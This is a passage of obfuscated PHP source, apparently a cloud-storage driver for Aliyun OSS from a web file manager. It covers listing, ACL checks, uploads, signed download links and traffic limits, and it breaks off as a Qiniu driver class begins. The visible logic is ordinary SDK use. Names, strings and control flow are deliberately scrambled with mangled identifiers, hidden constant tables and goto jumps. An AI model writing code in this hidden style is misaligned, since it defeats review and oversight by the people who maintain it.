DåÍç‚©Á; Fä‰ éëÜ: $FáåÆƒ ©¹ =& $_SERVER[ì‹É]; $BßĞóåøˆ‘ = array($FáåÆƒ ©¹[28] => $this->pathThis($C¨˜ÉœƒùÍ), $FáåÆƒ ©¹[76] => $this->getPathOuter($C¨˜ÉœƒùÍ), $FáåÆƒ ©¹[29] => $FáåÆƒ ©¹[164], $FáåÆƒ ©¹[184] => $FáåÆƒ ©¹[50], $FáåÆƒ ©¹[108] => $FáåÆƒ ©¹[50], $FáåÆƒ ©¹[78] => 0, $FáåÆƒ ©¹[157] => $this->ext($C¨˜ÉœƒùÍ), $FáåÆƒ ©¹[185] => !0, $FáåÆƒ ©¹[186] => !0); if (empty($FİËÜ†Ü Ú)) { $fäèñ‚«ÃÁ = $this->objectMeta($C¨˜ÉœƒùÍ); if (!$fäèñ‚«ÃÁ) { return $BßĞóåøˆ‘; } $FİËÜ†Ü Ú = array($FáåÆƒ ©¹[108] => strtotime($fäèñ‚«ÃÁ[$FáåÆƒ ©¹[1155]]), $FáåÆƒ ©¹[78] => $fäèñ‚«ÃÁ[$FáåÆƒ ©¹[1156]] + 0); } goto Fí´Ùêöİ¶; fğÕŠãèÊŒ: } private function folderInfo($C›ÖİğñÅœ, $C§¡Å‚·„ª = array()) { $BÖ¿À‚æƒ =& $_SERVER[ì‹É]; $C†Ã‹¸¾ = array($BÖ¿À‚æƒ[28] => $this->pathThis($C›ÖİğñÅœ), $BÖ¿À‚æƒ[76] => $this->getPathOuter($BÖ¿À‚æƒ[8] . $C›ÖİğñÅœ), $BÖ¿À‚æƒ[29] => $BÖ¿À‚æƒ[77], $BÖ¿À‚æƒ[184] => $BÖ¿À‚æƒ[50], $BÖ¿À‚æƒ[108] => $BÖ¿À‚æƒ[50], $BÖ¿À‚æƒ[185] => !0, $BÖ¿À‚æƒ[186] => !0); if (empty($C§¡Å‚·„ª)) { $C›ÖİğñÅœ = rtrim($C›ÖİğñÅœ, $BÖ¿À‚æƒ[8]) . $BÖ¿À‚æƒ[8]; $DÖ×ˆåøĞô = $this->objectMeta($C›ÖİğñÅœ); if (!$DÖ×ˆåøĞô) { return $C†Ã‹¸¾; } $C§¡Å‚·„ª = array($BÖ¿À‚æƒ[184] => $DÖ×ˆåøĞô[$BÖ¿À‚æƒ[1157]][$BÖ¿À‚æƒ[1158]], $BÖ¿À‚æƒ[108] => strtotime($DÖ×ˆåøĞô[$BÖ¿À‚æƒ[1155]])); } if (isset($C§¡Å‚·„ª[$BÖ¿À‚æƒ[108]])) { $C†Ã‹¸¾[$BÖ¿À‚æƒ[108]] = $C§¡Å‚·„ª[$BÖ¿À‚æƒ[108]]; } if (isset($C§¡Å‚·„ª[$BÖ¿À‚æƒ[184]])) { $C†Ã‹¸¾[$BÖ¿À‚æƒ[184]] = $C§¡Å‚·„ª[$BÖ¿À‚æƒ[184]]; } return $C†Ã‹¸¾; } public function listPath($d¨¤‹¼Èå‰, $dù‰×¾ŸŸ = false) { $e‡›Ö´ß³ç =& $_SERVER[ì‹É]; $E¢¿·²Ÿ” = $this->fileList($d¨¤‹¼Èå‰, $e‡›Ö´ß³ç[8], !0); foreach ($E¢¿·²Ÿ”[$e‡›Ö´ß³ç[75]] as $Fİ¹ƒÈÚòù => $a‰â…œ•²ô) { $E¢¿·²Ÿ”[$e‡›Ö´ß³ç[75]][$Fİ¹ƒÈÚòù] = $this->folderInfo($a‰â…œ•²ô, $a‰â…œ•²ô); } foreach ($E¢¿·²Ÿ”[$e‡›Ö´ß³ç[74]] as $Fİ¹ƒÈÚòù => $a‰â…œ•²ô) { $E¢¿·²Ÿ”[$e‡›Ö´ß³ç[74]][$Fİ¹ƒÈÚòù] = $this->fileInfo($a‰â…œ•²ô[$e‡›Ö´ß³ç[28]], $a‰â…œ•²ô); } return $E¢¿·²Ÿ”; } public function has($CÔÌËÔ¡àÓ, $E©ÌÍĞê˜” = false, $cÔµÛ»®à = true) { goto f“È°’Ä¾×; c¦Ö§Šæ÷Ô: $dËÃ«æİê¡ = $b«Å¿†Á³Í[33]; $EÁÏ¥»á = 500; $Dº³ÆëÌ¶Â = 0; goto c˜¯ğ­÷ï„; c˜¯ğ­÷ï„: $D£“£ØÀ«¸ = 0; while (!0) { $C¹›‘Èµô = array($b«Å¿†Á³Í[1146] => $b«Å¿†Á³Í[8], $b«Å¿†Á³Í[183] => $BÕÃ¥®¹Ê, $b«Å¿†Á³Í[1147] => $EÁÏ¥»á, $b«Å¿†Á³Í[1148] => $dËÃ«æİê¡); try { $cçÏÅ ‰Ù¾ = $this->client->listObjects($this->bucket, $C¹›‘Èµô); } catch (OSS\Core\OssException $d°–ƒåõì) { break; } $dËÃ«æİê¡ = $cçÏÅ ‰Ù¾->getNextMarker(); $f˜‚Ã¡¢˜Œ = $cçÏÅ ‰Ù¾->getObjectList(); $F†Ø‹­ğåÉ = $cçÏÅ ‰Ù¾->getPrefixList(); if ($E©ÌÍĞê˜”) { if (count($f˜‚Ã¡¢˜Œ) > 1 || count($f˜‚Ã¡¢˜Œ) == 1 && $f˜‚Ã¡¢˜Œ[0]->getKey() != $BÕÃ¥®¹Ê) { $Dº³ÆëÌ¶Â += count($f˜‚Ã¡¢˜Œ) - 1; } if (!empty($F†Ø‹­ğåÉ)) { $D£“£ØÀ«¸ += count($F†Ø‹­ğåÉ); } if ($dËÃ«æİê¡ === $b«Å¿†Á³Í[33]) { break; } continue; } if ($cÔµÛ»®à) { if (!empty($f˜‚Ã¡¢˜Œ)) { if (count($f˜‚Ã¡¢˜Œ) > 1 || $f˜‚Ã¡¢˜Œ[0]->getKey() != $BÕÃ¥®¹Ê) { return !0; } } } else { if (!empty($F†Ø‹­ğåÉ)) { return !0; } } if ($dËÃ«æİê¡ === $b«Å¿†Á³Í[33]) { break; } } if ($E©ÌÍĞê˜”) { return array($b«Å¿†Á³Í[188] => $Dº³ÆëÌ¶Â, $b«Å¿†Á³Í[189] => $D£“£ØÀ«¸); } goto A¹ÜòœÄÉÄ; f“È°’Ä¾×: $b«Å¿†Á³Í =& $_SERVER[ì‹É]; $CÔÌËÔ¡àÓ = trim($CÔÌËÔ¡àÓ, $b«Å¿†Á³Í[8]); $BÕÃ¥®¹Ê = empty($CÔÌËÔ¡àÓ) ? $b«Å¿†Á³Í[33] : $CÔÌËÔ¡àÓ . $b«Å¿†Á³Í[8]; goto c¦Ö§Šæ÷Ô; A¹ÜòœÄÉÄ: return !1; goto cÏã¼Æå¥; cÏã¼Æå¥: } public function listAll($eàÛ³ÓÍÕÙ) { $A­†ŞÓ„ô =& $_SERVER[ì‹É]; $EÉ ›¶Í¡ = $this->fileList($eàÛ³ÓÍÕÙ, $A­†ŞÓ„ô[33], !0); $f¼™è¬ = array(); foreach ($EÉ ›¶Í¡[$A­†ŞÓ„ô[74]] as $BÌ»¾™Åçæ) { $f¼™è¬[$BÌ»¾™Åçæ[$A­†ŞÓ„ô[28]]] = $BÌ»¾™Åçæ[$A­†ŞÓ„ô[78]]; } return $this->listAllFiles($eàÛ³ÓÍÕÙ, array_keys($f¼™è¬), $f¼™è¬); } public function canRead($B¬Øïãç¹) { $Fäó¾ÀôŠğ =& $_SERVER[ì‹É]; $aÆˆ†áÄõ‘ = $this->pathAcl($B¬Øïãç¹); return $aÆˆ†áÄõ‘ == $Fäó¾ÀôŠğ[1159] || $aÆˆ†áÄõ‘ == $Fäó¾ÀôŠğ[483] ? !0 : !1; } public function canWrite($CŠ·ğ™óŸŠ) { $C®Ú¥¨á¯³ = $this->pathAcl($CŠ·ğ™óŸŠ); return $C®Ú¥¨á¯³ == $_SERVER[ì‹É][483] ? !0 : !1; } public function pathAcl($AãÌññ˜Â¢) { goto B¾øÆ‹¿; e®Ù©¼ò: return $e«ÔçÚ¹âÔ; goto CãÛ®Ò¶È; A´¼á…°èÚ: $e«ÔçÚ¹âÔ = $fÖŸå»ò­³ == $báŠ¸ª‡Î[34] ? $this->bucketAcl : $fÖŸå»ò­³; if ($e«ÔçÚ¹âÔ == $báŠ¸ª‡Î[1160]) { return $báŠ¸ª‡Î[1159]; } if ($e«ÔçÚ¹âÔ == $báŠ¸ª‡Î[1161]) { return $báŠ¸ª‡Î[483]; } goto e®Ù©¼ò; B¾øÆ‹¿: $báŠ¸ª‡Î =& $_SERVER[ì‹É]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $fÖŸå»ò­³ = $this->client->getObjectAcl($this->bucket, $AãÌññ˜Â¢); } catch (OSS\Core\OssException $c«ˆÃÀºÅ) { return !1; } goto A´¼á…°èÚ; CãÛ®Ò¶È: } private function chmodPath($FÚ¼¾Ñ°Â, $DíÒ•ÖÆ¤÷ = '') { $cçÌ¯Ÿ‰î =& $_SERVER[ì‹É]; $d¶á™õõøô = empty($DíÒ•ÖÆ¤÷) ? $cçÌ¯Ÿ‰î[1161] : $DíÒ•ÖÆ¤÷; $CØ¬ø¥Ûä“ = array($cçÌ¯Ÿ‰î[34], $cçÌ¯Ÿ‰î[182], $cçÌ¯Ÿ‰î[1160], $cçÌ¯Ÿ‰î[1161]); if (!in_array($d¶á™õõøô, $CØ¬ø¥Ûä“)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $FÚ¼¾Ñ°Â, $d¶á™õõøô); } catch (OSS\Core\OssException $CòÛíÃİã) { return !1; } return !0; } public function getContent($b¢ñ…èµİ) { return $this->fileSubstr($b¢ñ…èµİ, -1); } public function setContent($b™µœ‰ÛÍ, $eÄŒğ ÓâÈ = '') { $fç—Ê·õ„¶ =& $_SERVER[ì‹É]; try { $A’¤¶„‰ø¬ = $this->trafficLimit($fç—Ê·õ„¶[1162]); $bŒÑÓ§ = $this->client->putObject($this->bucket, $b™µœ‰ÛÍ, $eÄŒğ ÓâÈ, $A’¤¶„‰ø¬); } catch (OSS\Core\OssException $c˜¿Õ™š×›) { return !1; } $EÖ¯š„ä‹ = array($fç—Ê·õ„¶[1149] => trim($bŒÑÓ§[$fç—Ê·õ„¶[1163]], $fç—Ê·õ„¶[114]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($b™µœ‰ÛÍ))); $this->updateObjMeta($b™µœ‰ÛÍ, $EÖ¯š„ä‹); return isset($bŒÑÓ§[$fç—Ê·õ„¶[1164]][$fç—Ê·õ„¶[1110]]) ? (int) $bŒÑÓ§[$fç—Ê·õ„¶[1164]][$fç—Ê·õ„¶[1110]] : strlen($bŒÑÓ§); } private function updateObjMeta($f›õè¶Ñ, $D•‘Öğ¸îÔ) { try { $DĞ¸Œà‰Î¥ = array(OSS\OssClient::OSS_HEADERS => $D•‘Öğ¸îÔ); $this->client->copyObject($this->bucket, $f›õè¶Ñ, $this->bucket, $f›õè¶Ñ, $DĞ¸Œà‰Î¥); } catch (OSS\Core\OssException $C…ƒ…ÅÅ¬) { return !1; } return !0; } public function upload($DšÆ†•Çò¬, $A…¦ˆÌÓ†, $E…¨¸Š¯ÖÃ = false, $eñÊÓ»©Ş¯ = REPEAT_REPLACE) { $Fö‡ÚîÂ =& $_SERVER[ì‹É]; $d‹†å¬Íˆ¡ = trim($DšÆ†•Çò¬, $Fö‡ÚîÂ[8]); $C“¼Â’„®¬ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($Fö‡ÚîÂ[1149] => @md5_file($A…¦ˆÌÓ†)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($DšÆ†•Çò¬))); $C“¼Â’„®¬ = $this->trafficLimit($Fö‡ÚîÂ[1162], $C“¼Â’„®¬); try { $this->client->multiuploadFile($this->bucket, $d‹†å¬Íˆ¡, $A…¦ˆÌÓ†, $C“¼Â’„®¬); } catch (OSS\Core\OssException $Bç±ê®“¿Ò) { return !1; } return $this->getPathOuter($DšÆ†•Çò¬); } public function getHost() { $aÛ›ÚÒ„˜ =& $_SERVER[ì‹É]; $b¢¡™ÑÙ§  = explode($aÛ›ÚÒ„˜[168], parent::getHost()); return $b¢¡™ÑÙ§ [0] . $aÛ›ÚÒ„˜[168] . $this->bucket . $aÛ›ÚÒ„˜[94] . $b¢¡™ÑÙ§ [1]; } public function uploadFormData($e­´…ß±å¡, $DÊÁ·­Ãº = 3600) { goto E¨‚’ƒË–®; E¨‚’ƒË–®: $aƒ°–ÁÇ´’ =& $_SERVER[ì‹É]; if (!($b™«â¢×À° = $this->getHost())) { return !1; } $e‚õ¨­Èõä = $DÊÁ·­Ãº; goto A¾…øŠ—°¹; F¿™õ÷ˆ¥Ï: return $AÃˆÃÆ—¼Ê; goto bùÁ¯×Ç‹¶; DºÙê£ –†: $f˜®¥«†»¨ = base64_encode(hash_hmac($aƒ°–ÁÇ´’[215], $EÚæøšÜ£¹, $this->secret, !0)); $AÃˆÃÆ—¼Ê = array($aƒ°–ÁÇ´’[1078] => $EÚæøšÜ£¹, $aƒ°–ÁÇ´’[1168] => $this->accessKey, $aƒ°–ÁÇ´’[1074] => $aƒ°–ÁÇ´’[1066], $aƒ°–ÁÇ´’[1169] => $f˜®¥«†»¨, $aƒ°–ÁÇ´’[166] => $b™«â¢×À°); $AÃˆÃÆ—¼Ê = $this->trafficLimit($aƒ°–ÁÇ´’[1162], $AÃˆÃÆ—¼Ê); goto F¿™õ÷ˆ¥Ï; A¾…øŠ—°¹: $E¼Îˆ¸‚›’ = date($aƒ°–ÁÇ´’[1165], time() + $e‚õ¨­Èõä); $e²”£ö„µ˜ = new DateTime($E¼Îˆ¸‚›’); $Cã±‹¿å«• = $e²”£ö„µ˜->format(DateTime::ISO8601); goto Dæ²°‰°Ó; dã‰İè†’…: $fäºŠêÕ¿ = $this->pathFather($e­´…ß±å¡); $dÃ“‰¼‰¤‚ = array($aƒ°–ÁÇ´’[1068] => $Cã±‹¿å«•, $aƒ°–ÁÇ´’[1069] => array(array($aƒ°–ÁÇ´’[1167], 0, $b”†•ÍµÃ), array($aƒ°–ÁÇ´’[1072], $aƒ°–ÁÇ´’[1073], $fäºŠêÕ¿))); $EÚæøšÜ£¹ = base64_encode(json_encode($dÃ“‰¼‰¤‚)); goto DºÙê£ –†; Dæ²°‰°Ó: $F”Ğ¾è‰Ÿù = strpos($Cã±‹¿å«•, $aƒ°–ÁÇ´’[281]); $Cã±‹¿å«• = substr($Cã±‹¿å«•, 0, $F”Ğ¾è‰Ÿù) . $aƒ°–ÁÇ´’[1166]; $b”†•ÍµÃ = 1048576000 * 5; goto dã‰İè†’…; bùÁ¯×Ç‹¶: } public function multiUploadFormData($Aßç„Í²´È, $bøŸöãìœÑ = 3600) { $bÔ’¡´à© =& $_SERVER[ì‹É]; if (!($aË¶ñæÉ‡± = $this->getHost())) { return !1; } $fŠ›®óß’† = $this->trafficLimit($bÔ’¡´à©[1162]); $F—ù™—‹î = $this->client->initiateMultipartUpload($this->bucket, $Aßç„Í²´È, $fŠ›®óß’†); return array($bÔ’¡´à©[206] => $F—ù™—‹î, $bÔ’¡´à©[166] => $aË¶ñæÉ‡± . $bÔ’¡´à©[8] . $this->pathEncode($Aßç„Í²´È), $bÔ’¡´à©[207] => gmdate($bÔ’¡´à©[1170]), $bÔ’¡´à©[90] => $Aßç„Í²´È); } public function multiUploadAuthData($fƒì…Õ»±±, $aââ·©”® = array()) { goto FÚßÏšøà‰; A¶¢åœ¤š®: $b›è„ô’¾Œ = $fƒì…Õ»±±; if (isset($aââ·©”®[$fòö‰˜Œğ[90]])) { $b›è„ô’¾Œ = $aââ·©”®[$fòö‰˜Œğ[90]]; unset($aââ·©”®[$fòö‰˜Œğ[90]]); } if (isset($aââ·©”®[$fòö‰˜Œğ[208]])) { $aââ·©”®[$fòö‰˜Œğ[207]] = $cÉÍ…İÂØ—; return $this->listUploadParts($b›è„ô’¾Œ, $aââ·©”®); } goto BöÈª¶Õá; BöÈª¶Õá: $d«÷™ç¼ = array($fòö‰˜Œğ[209], $fòö‰˜Œğ[33], $fòö‰˜Œğ[117], $cÉÍ…İÂØ—, "\x78\55\157\x73\x73\55\144\141\x74\x65\72{$cÉÍ…İÂØ—}", $fòö‰˜Œğ[8] . $this->bucket . $fòö‰˜Œğ[8] . $b›è„ô’¾Œ . $B‚ƒöŸ£ªÃ); if (strpos($B‚ƒöŸ£ªÃ, $fòö‰˜Œğ[210]) === 0) { $d«÷™ç¼[0] = $fòö‰˜Œğ[211]; if ($AÂ‰˜Æ…µ = $this->trafficLimit($fòö‰˜Œğ[1162])) { $b›è„ô’¾Œ = $fòö‰˜Œğ[1171]; array_splice($d«÷™ç¼, 5, 0, $b›è„ô’¾Œ . $fòö‰˜Œğ[4] . $AÂ‰˜Æ…µ[$b›è„ô’¾Œ]); } } if (isset($aââ·©”®[$fòö‰˜Œğ[212]]) && $aââ·©”®[$fòö‰˜Œğ[212]] == $fòö‰˜Œğ[213]) { $d«÷™ç¼[0] = $fòö‰˜Œğ[213]; } goto Aöß„ˆèÜ†; FÚßÏšøà‰: $fòö‰˜Œğ =& $_SERVER[ì‹É]; $cÉÍ…İÂØ— = isset($aââ·©”®[$fòö‰˜Œğ[207]]) ? $aââ·©”®[$fòö‰˜Œğ[207]] : gmdate($fòö‰˜Œğ[1170]); $B‚ƒöŸ£ªÃ = isset($aââ·©”®[$fòö‰˜Œğ[157]]) ? $aââ·©”®[$fòö‰˜Œğ[157]] : $fòö‰˜Œğ[33]; goto A¶¢åœ¤š®; Aöß„ˆèÜ†: if (!empty($aââ·©”®[$fòö‰˜Œğ[1172]])) { $DÕîÈØá¼ù = array_merge(array($d«÷™ç¼[4]), $aââ·©”®[$fòö‰˜Œğ[1172]]); sort($DÕîÈØá¼ù); $d«÷™ç¼[4] = implode($fòö‰˜Œğ[214], $DÕîÈØá¼ù); } $AÃºåÍÌé± = implode($fòö‰˜Œğ[214], $d«÷™ç¼); $dà«­²”Ñö = base64_encode(hash_hmac($fòö‰˜Œğ[215], $AÃºåÍÌé±, $this->secret, !0)); goto F×¦ß“Ÿº®; F×¦ß“Ÿº®: $Dîƒ–•¿¾— = $fòö‰˜Œğ[1173] . $this->accessKey . $fòö‰˜Œğ[4] . $dà«­²”Ñö; if (strpos($B‚ƒöŸ£ªÃ, $fòö‰˜Œğ[210]) === 0) { $Dîƒ–•¿¾— = array($fòö‰˜Œğ[217] => $Dîƒ–•¿¾—, $fòö‰˜Œğ[207] => $cÉÍ…İÂØ—); if ($AÂ‰˜Æ…µ) { $Dîƒ–•¿¾— = array_merge($Dîƒ–•¿¾—, $AÂ‰˜Æ…µ); } } return $Dîƒ–•¿¾—; goto BŠ‘Üâ¢¦’; BŠ‘Üâ¢¦’: } public function listUploadParts($a‡›¹¶•¢‡, $A¦·””å¶ï) { goto DÀ­Œ°à¸; AÕ‚Ã·®Ã: unset($A¦·””å¶ï[$aºğô«Ô½ˆ[208]], $A¦·””å¶ï[$aºğô«Ô½ˆ[212]]); $Dš«Ôñˆù = $this->multiUploadAuthData($a‡›¹¶•¢‡, $A¦·””å¶ï); if (empty($Dš«Ôñˆù)) { return !1; } goto AÆÄˆ–Íäğ; AÆÄˆ–Íäğ: return array($aºğô«Ô½ˆ[217] => $Dš«Ôñˆù, $aºğô«Ô½ˆ[207] => $A¦·””å¶ï[$aºğô«Ô½ˆ[207]], $aºğô«Ô½ˆ[219] => $AĞ©’ ï); goto AÔù“ö›š; DÀ­Œ°à¸: $aºğô«Ô½ˆ =& $_SERVER[ì‹É]; $Bñª‹õÒØ¨ = parse_url_query($A¦·””å¶ï[$aºğô«Ô½ˆ[157]]); $A¿ñ×ÌåŠ = $this->client->listParts($this->bucket, $a‡›¹¶•¢‡, $Bñª‹õÒØ¨[$aºğô«Ô½ˆ[206]]); goto dÚğºóÎöÔ; dÚğºóÎöÔ: $Dô®ŸÛÛÁ = $A¿ñ×ÌåŠ->getListPart(); $AĞ©’ ï = array(); foreach ($Dô®ŸÛÛÁ as $F¹ô÷äãâö) { $AĞ©’ ï[] = array($aºğô«Ô½ˆ[1153] => $F¹ô÷äãâö->getPartNumber(), $aºğô«Ô½ˆ[1154] => trim($F¹ô÷äãâö->getETag(), $aºğô«Ô½ˆ[114])); } goto AÕ‚Ã·®Ã; AÔù“ö›š: } public function download($AêÁŒ‚Ôô›, $BîŒ™‘Ñà‚) { if ($this->isFolder($AêÁŒ‚Ôô›)) { return !1; } try { $aÀ†÷…Æ‚Ã = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $BîŒ™‘Ñà‚); $aÀ†÷…Æ‚Ã = $this->trafficLimit($_SERVER[ì‹É][106], $aÀ†÷…Æ‚Ã); $this->client->getObject($this->bucket, $AêÁŒ‚Ôô›, $aÀ†÷…Æ‚Ã); } catch (OSS\Core\OssException $e—Å‚æˆæ) { return !1; } return $BîŒ™‘Ñà‚; } public function fileSubstr($DÀµÄãÓ, $d³×ÆÊ»Ô = 0, $Ešå†¼®öÜ = false) { if ($d³×ÆÊ»Ô === -1) { $Aùé»Ï¥è¾ = array(); } else { if ($Ešå†¼®öÜ === !1) { $a°¿âª‹×§ = $this->size($DÀµÄãÓ); } else { $a°¿âª‹×§ = $d³×ÆÊ»Ô + $Ešå†¼®öÜ - 1; } $Aùé»Ï¥è¾ = array(OSS\OssClient::OSS_RANGE => "{$d³×ÆÊ»Ô}\x2d{$a°¿âª‹×§}"); } try { return $this->client->getObject($this->bucket, $DÀµÄãÓ, $Aùé»Ï¥è¾); } catch (OSS\Core\OssException $E‚ó†ç ùÑ) { return !1; } } private function trafficLimit($Eå‹Ò·ƒ…, $D•«‰Ö÷§Å = array()) { goto AÂ¦¶ó‹Ï·; AÂ¦¶ó‹Ï·: $A‹™ô»ˆ¨Ù =& $_SERVER[ì‹É]; if ($Eå‹Ò·ƒ… == $A‹™ô»ˆ¨Ù[1162] && $this->isUploadServer() || $Eå‹Ò·ƒ… == $A‹™ô»ˆ¨Ù[106] && $this->isFileOutServer()) { return $D•«‰Ö÷§Å; } $fà®Ğ–ÛáÔ = floatval($GLOBALS[$A‹™ô»ˆ¨Ù[6]][$A‹™ô»ˆ¨Ù[85]][$A‹™ô»ˆ¨Ù[92]][$Eå‹Ò·ƒ…]) * 1024 * 1024 * 8; goto a‹‚§Œ†À”; C·Ô¥ò‡–: return $D•«‰Ö÷§Å; goto e„±µ†±; a‹‚§Œ†À”: if (!$fà®Ğ–ÛáÔ) { return $D•«‰Ö÷§Å; } $fà®Ğ–ÛáÔ = $fà®Ğ–ÛáÔ < 819200 ? 819200 : ($fà®Ğ–ÛáÔ > 838860800 ? 838860800 : $fà®Ğ–ÛáÔ); $D•«‰Ö÷§Å[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($fà®Ğ–ÛáÔ); goto C·Ô¥ò‡–; e„±µ†±: } public function link($Fßœ‰ã¤À, $FÀñ¦ä¾Ì– = array()) { $A²‹µµ¾¡Í =& $_SERVER[ì‹É]; if (!$this->exist($Fßœ‰ã¤À) || $this->isFolder($Fßœ‰ã¤À)) { return !1; } try { $FÀñ¦ä¾Ì– = $this->trafficLimit($A²‹µµ¾¡Í[106], $FÀñ¦ä¾Ì–); $FÊ²§å„Ë = $this->client->signUrl($this->bucket, $Fßœ‰ã¤À, 3600 * 12, $A²‹µµ¾¡Í[213], $FÀñ¦ä¾Ì–); return $this->getCdnLink($FÊ²§å„Ë); } catch (OSS\Core\OssException $C½Ëğ½´ö) { return !1; } } public function fileOut($E©İºÊ‚, $b±Ìê¹ãÚ = false, $EÚ‚ÁØŠá÷ = false, $DÖ“–£ğñ = '') { goto Bø†ß£™¿ë; C°à˜«ë„: $D›†ƒî«ãÇ[OSS\OssClient::OSS_SUB_RESOURCE] .= $E‘İõğÍ[1175] . $BŒÑáÎ¯ÉŸ; $DÙ·Â•“ÆÊ = $this->link($E©İºÊ‚, $D›†ƒî«ãÇ); $this->fileOutLink($DÙ·Â•“ÆÊ); goto BÓ¸Û³•Õ; Bø†ß£™¿ë: $E‘İõğÍ =& $_SERVER[ì‹É]; if (!$EÚ‚ÁØŠá÷) { $EÚ‚ÁØŠá÷ = $this->pathThis($E©İºÊ‚); } $BŒÑáÎ¯ÉŸ = get_file_mime(get_path_ext($EÚ‚ÁØŠá÷)); goto B…„Ø‘ÒÛ‚; B…„Ø‘ÒÛ‚: if ($BŒÑáÎ¯ÉŸ == $E‘İõğÍ[198]) { return parent::fileOut($E©İºÊ‚, $b±Ìê¹ãÚ, $EÚ‚ÁØŠá÷, $DÖ“–£ğñ); } $b±Ìê¹ãÚ = $b±Ìê¹ãÚ ? $E‘İõğÍ[199] : $E‘İõğÍ[200]; $D›†ƒî«ãÇ = array(OSS\OssClient::OSS_SUB_RESOURCE => $E‘İõğÍ[1174] . rawurlencode("{$b±Ìê¹ãÚ}\73\x66\x69\154\145\156\x61\155\x65\75{$EÚ‚ÁØŠá÷}")); goto C°à˜«ë„; BÓ¸Û³•Õ: } public function fileOutServer($E•»°ó‡½, $d‡÷—†Šß¤ = false, $cÑˆò¹«Ñğ = false, $f°ÑÆÚä½ã = '') { parent::fileOut($E•»°ó‡½, $d‡÷—†Šß¤, $cÑˆò¹«Ñğ, $f°ÑÆÚä½ã); } public function fileOutImage($DèÖİª¡Ÿ¢, $b˜æ±Ğ¸Ç½ = 250) { $c§öŒï¢¨ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ì‹É][1176] . $b˜æ±Ğ¸Ç½); $D›’²‚ã = $this->link($DèÖİª¡Ÿ¢, $c§öŒï¢¨); $this->fileOutLink($D›’²‚ã); } public function fileOutImageServer($D°†ÆÃóÉê, $C†Ö¨’½ë = 250) { parent::fileOutImage($D°†ÆÃóÉê, $C†Ö¨’½ë); } public function fileOutLink($a¬à«è¯Œ) { $c‚ÆÎÓ¬»¼ =& $_SERVER[ì‹É]; if (!$this->isCdnHost() && substr($a¬à«è¯Œ, 0, 7) == $c‚ÆÎÓ¬»¼[1081]) { $a¬à«è¯Œ = $c‚ÆÎÓ¬»¼[1082] . substr($a¬à«è¯Œ, 7); } header($c‚ÆÎÓ¬»¼[153] . $a¬à«è¯Œ); die; } public function hashMd5($DÃí£ÄçÜ‰, $E§—×Ù”–İ = '') { $E™•‚øë¶Ş =& $_SERVER[ì‹É]; $fô…¹ï Ğ¡ = $this->objectMeta($DÃí£ÄçÜ‰); if (!$fô…¹ï Ğ¡) { return $E™•‚øë¶Ş[33]; } if (!isset($fô…¹ï Ğ¡[$E™•‚øë¶Ş[1149]]) && !empty($E§—×Ù”–İ)) { $aÉœ­±š­³ = $this->updateObjMeta($DÃí£ÄçÜ‰, array($E™•‚øë¶Ş[1149] => $E§—×Ù”–İ)); $fô…¹ï Ğ¡[$E™•‚øë¶Ş[1149]] = $aÉœ­±š­³ ? $E§—×Ù”–İ : $E™•‚øë¶Ş[33]; } return isset($fô…¹ï Ğ¡[$E™•‚øë¶Ş[1149]]) ? strtolower($fô…¹ï Ğ¡[$E™•‚øë¶Ş[1149]]) : $E™•‚øë¶Ş[33]; } public function size($d‰Ö—‡½Ë) { $e—Ä¯Õ·‡ƒ = $this->objectMeta($d‰Ö—‡½Ë); return $e—Ä¯Õ·‡ƒ ? $e—Ä¯Õ·‡ƒ[$_SERVER[ì‹É][78]] : 0; } public function info($fÛƒŠ÷¾ÑŞ) { if ($this->isFolder($fÛƒŠ÷¾ÑŞ)) { return $this->folderInfo($fÛƒŠ÷¾ÑŞ); } else { if ($this->isFile($fÛƒŠ÷¾ÑŞ)) { return $this->fileInfo($fÛƒŠ÷¾ÑŞ); } } return !1; } public function exist($eÃğ¾Ÿßªè) { return $this->isFile($eÃğ¾Ÿßªè) || $this->isFolder($eÃğ¾Ÿßªè); } public function isFile($eÉÓŸ¿“†ğ) { return !$this->isFolder($eÉÓŸ¿“†ğ) && $this->objectMeta($eÉÓŸ¿“†ğ); } public function isFolder($dÓßÓ ¤Û›) { return $this->cacheMethod($_SERVER[ì‹É][220], $dÓßÓ ¤Û›); } protected function objectMeta($BÇ‚íèóŒï) { return $this->cacheMethod($_SERVER[ì‹É][221], $BÇ‚íèóŒï); } protected function _objectMeta($e„Ò¬÷„) { $E§ñœˆ³·Ñ =& $_SERVER[ì‹É]; try { $c¹Œ…¶Í¸ = $this->client->getObjectMeta($this->bucket, $e„Ò¬÷„); } catch (OSS\Core\OssException $bĞ¿àÖ‘õå) { $c¹Œ…¶Í¸ = !1; } if ($c¹Œ…¶Í¸) { $c¹Œ…¶Í¸[$E§ñœˆ³·Ñ[78]] = intval($c¹Œ…¶Í¸[$E§ñœˆ³·Ñ[1156]]); } return $c¹Œ…¶Í¸; } protected function _isFolder($EÎã” ŒåË) { $A‰ÊÃù¿³ =& $_SERVER[ì‹É]; if ($EÎã” ŒåË == $A‰ÊÃù¿³[33] || $EÎã” ŒåË == $A‰ÊÃù¿³[8]) { return !0; } $Eö˜‡ì‚„ = array($A‰ÊÃù¿³[1146] => $A‰ÊÃù¿³[8], $A‰ÊÃù¿³[183] => rtrim($EÎã” ŒåË, $A‰ÊÃù¿³[8]) . $A‰ÊÃù¿³[8], $A‰ÊÃù¿³[1147] => 1, $A‰ÊÃù¿³[1148] => $A‰ÊÃù¿³[33]); $b¢Øñ·‚ˆ = $this->client->listObjects($this->bucket, $Eö˜‡ì‚„); if ($b¢Øñ·‚ˆ->getObjectList() || $b¢Øñ·‚ˆ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($C¦Ó…ÄÖ) { parent::__construct(); require_once SDK_DIR . 